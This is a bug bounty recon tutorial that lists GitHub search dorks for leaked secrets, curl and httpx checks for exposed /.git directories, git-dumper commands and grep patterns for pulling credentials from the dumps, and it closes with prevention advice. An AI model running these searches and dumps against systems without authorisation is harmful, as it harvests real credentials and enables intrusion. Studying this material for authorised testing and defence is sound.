# : GitHub Recon — Discovering High-Impact Leaks in Bug Bounty
- Source: (May 29, 2025) — infosecwriteups.com
- Automated GitHub dorking + .git directory exploitation

## Why GitHub Recon?
Developers unknowingly push sensitive data into public repos: API keys, credentials, tokens, internal endpoints, configuration files.

## GitHub Dorking Techniques

### Common Secret Patterns
```bash
# API Keys and Tokens
filename:.env
filename:.env.production
filename:.env.local
filename:credentials.json
filename:config.json
filename:secrets.yml
filename:dump.sql
filename:backup.sql

# Specific GitHub dorks
"target.com" "password"
"target.com" "api_key"
"target.com" "aws_secret"
"target.com" "-----BEGIN RSA PRIVATE KEY-----"
"target.com" "ghp_"  (GitHub tokens)
"target.com" "sk-"   (Stripe keys)
"target.com" "AIza"  (Google API keys)
"target.com" "AKIA"  (AWS access keys)
```

### Automated GitHub Scanning
```bash
# Using gitdorks.sh or custom scripts
# Search by organization
org:target-org password
org:target-org filename:.env

# Search by repo
repo:target/repo "DB_PASSWORD"
```

## Mass Hunting .git Directory Exposure

### Detection
```bash
# Check for /.git/config
curl -s -o /dev/null -w "%{http_code}" https://target.com/.git/config

# Automated scanning with httpx
httpx-toolkit -l subs.txt -path /.git/ -mc 200
cat domains.txt | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -ms "Index of"

# Check for /.git/HEAD
cat urls.txt | httpx-toolkit -silent -path /.git/config -mc 200 -ms "[core]"
```

### 403 is NOT a Dead End
Even if `/.git/` returns 403, individual files may still be accessible:
```bash
# Try direct file access
curl https://target.com/.git/HEAD
curl https://target.com/.git/config
curl https://target.com/.git/logs/HEAD
```

### Browser Extension
Install the .git browser extension — automatically alerts if any visited site exposes its Git repository.

## Dumping Exposed Git Repositories
```bash
# Git-Dumper
git-dumper https://target.com/.git/ /tmp/target-dump

# GitTools
gitdumper.sh https://target.com/.git/ /tmp/dump
cd /tmp/dump && git checkout .

# After dumping:
cd /tmp/target-dump
git log --oneline  # See all commits
git diff HEAD~1    # See latest changes
grep -r "password\|secret\|api_key\|token\|AKIA\|sk-\|AIza" .
cat .env           # Environment variables
```

## What to Look For After Dump
- `.env` files — database credentials, API keys, secrets
- `config/` directories — service configurations
- `dump.sql` / `backup.sql` — database dumps
- Commit messages containing passwords or tokens
- Old commits where secrets were "removed" (still in history)

## Prevention
- Never deploy `.git` directories to production
- Use `.gitignore` in deployment pipelines
- Scrub secrets from history with `git filter-branch` or BFG Repo-Cleaner
- Block `/.git` paths at web server level
- Use secret scanning tools (Gitleaks, truffleHog) pre-deploy
